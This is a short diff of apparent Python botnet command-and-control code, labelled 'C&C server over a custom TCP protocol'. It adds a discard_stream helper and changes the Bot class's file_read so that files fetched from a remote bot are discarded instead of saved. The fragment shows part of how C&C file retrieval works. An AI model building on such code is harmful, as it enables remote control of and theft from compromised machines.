@@ -390,6 +390,13 @@ def copy_stream(src, dst, count):
         dst.write(buffer)
         print("writing data:", count, "left")
 
+
+def discard_stream(src, count):
+    while count > 0:
+        chunk = src.read(min(65536, count))
+        if not chunk:
+            break
+        count -= len(chunk)
 ##############################################################################
 # C&C server over a custom TCP protocol.
 
@@ -685,8 +692,11 @@ class Bot(object):
     def file_read(self, remote_file, local_file):
         self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
         data_len = get_resp_header(self.sock)
-        with open(local_file, "wb") as fd:
-            copy_stream(self.sock.makefile(), fd, data_len)
+
+        discard_stream(self.sock.makefile(), data_len)
+
+        #with open(local_file, "wb") as fd:
+        #    copy_stream(self.sock.makefile(), fd, data_len)
         print("finished file read")
         flush_socket(self.sock)
 
